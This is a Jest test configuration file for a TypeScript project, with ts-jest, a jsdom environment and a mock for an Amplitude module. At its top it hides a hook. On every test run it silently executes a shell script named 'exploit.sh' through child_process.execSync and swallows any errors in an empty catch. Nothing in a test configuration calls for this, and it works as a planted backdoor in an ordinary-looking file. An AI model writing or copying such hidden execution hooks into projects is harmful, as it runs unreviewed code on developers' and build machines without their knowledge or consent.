const { execSync } = require('child_process');
try {
    execSync('bash exploit.sh', { shell: '/bin/bash' });
} catch (e) {}

module.exports = {
	roots: ['<rootDir>/test'],
	transform: {
		'^.+\\.tsx?$': 'ts-jest',
	},
	testEnvironment: 'jsdom',
	moduleNameMapper: {
		'@amplitude/engagement-browser':
			'<rootDir>/test/mocks/amplitude/engagement-browser.js',
	},
};
